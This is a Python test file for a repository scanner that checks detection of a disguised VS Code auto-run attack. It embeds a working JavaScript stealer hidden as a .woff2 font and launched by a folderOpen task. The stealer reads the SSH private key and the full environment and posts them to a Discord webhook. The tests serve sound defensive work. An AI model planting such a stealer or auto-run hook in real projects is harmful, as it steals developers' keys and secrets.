"""Payloads taken from real incidents, as text. Nothing here is executed.

The first one is a stealer that was once committed to this repository's own launch branch
as a "demo": a .woff2 file that is JavaScript, run by a VS Code task on folderOpen, which
reads ~/.ssh/id_rsa and the whole environment and posts them to a Discord webhook. The
scanner must say what it does, not only that it is disguised, and it must tell it apart
from the harmless demo that replaced it."""

import json
from pathlib import Path

from oss_pulse.scan import run_scan

STEALER = """(function () {
  const https = require('https');
  const os = require('os');
  const payload = JSON.stringify({
    host: os.hostname(),
    user: os.userInfo().username,
    env: process.env,
    keys: require('fs').readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8')
  });
  const req = https.request('https://discord.com/api/webhooks/000000/oss-pulse-inert-demo');
  req.write(payload);
  req.end();
})();
"""

HARMLESS = """(function () {
  console.log("oss-pulse demo: a real attack would have run here when you opened the folder.");
})();
"""

AUTO_RUN = {
    "version": "2.0.0",
    "tasks": [
        {
            "label": "build",
            "type": "shell",
            "command": "node .vscode/assets/font-awesome.woff2",
            "runOptions": {"runOn": "folderOpen"},
        }
    ],
}


def take_home(root: Path, payload: str) -> Path:
    assets = root / ".vscode" / "assets"
    assets.mkdir(parents=True)
    (root / ".vscode" / "tasks.json").write_text(json.dumps(AUTO_RUN))
    (assets / "font-awesome.woff2").write_text(payload)
    return root


def rules(folder: Path) -> dict[str, str]:
    return {f.rule_id: f.severity for f in run_scan(folder).findings}


def test_disguised_stealer_is_described_not_just_flagged(tmp_path):
    found = rules(take_home(tmp_path / "stealer", STEALER))
    assert found["AUTO-VSCODE"] == "critical"
    assert found["CODE-HIDDEN"] == "high"
    assert found["CODE-SECRETS"] == "high"
    assert found["CODE-EXFIL"] == "high"
    assert found["CODE-ENVDUMP"] == "high"


def test_same_stealer_as_plain_javascript(tmp_path):
    folder = tmp_path / "plain"
    folder.mkdir()
    (folder / "collect.js").write_text(STEALER)
    assert {"CODE-SECRETS", "CODE-EXFIL", "CODE-ENVDUMP"} <= set(rules(folder))


def test_harmless_demo_is_held_but_not_called_a_stealer(tmp_path):
    found = rules(take_home(tmp_path / "demo", HARMLESS))
    assert {"AUTO-VSCODE", "CODE-HIDDEN"} <= set(found)
    assert not {"CODE-SECRETS", "CODE-EXFIL", "CODE-ENVDUMP"} & set(found)


def test_child_process_env_is_not_an_environment_dump(tmp_path):
    folder = tmp_path / "build-tool"
    folder.mkdir()
    (folder / "run.js").write_text(
        "const { spawn } = require('child_process');\n"
        "spawn('npm', ['test'], { env: process.env, stdio: 'inherit' });\n"
    )
    assert "CODE-ENVDUMP" not in rules(folder)


def test_the_committed_demo_stays_harmless():
    demo = Path(__file__).resolve().parents[1] / "examples" / "take-home"
    found = rules(demo)
    assert {"AUTO-VSCODE", "CODE-HIDDEN"} <= set(found)
    assert not {"CODE-SECRETS", "CODE-EXFIL", "CODE-ENVDUMP"} & set(found)
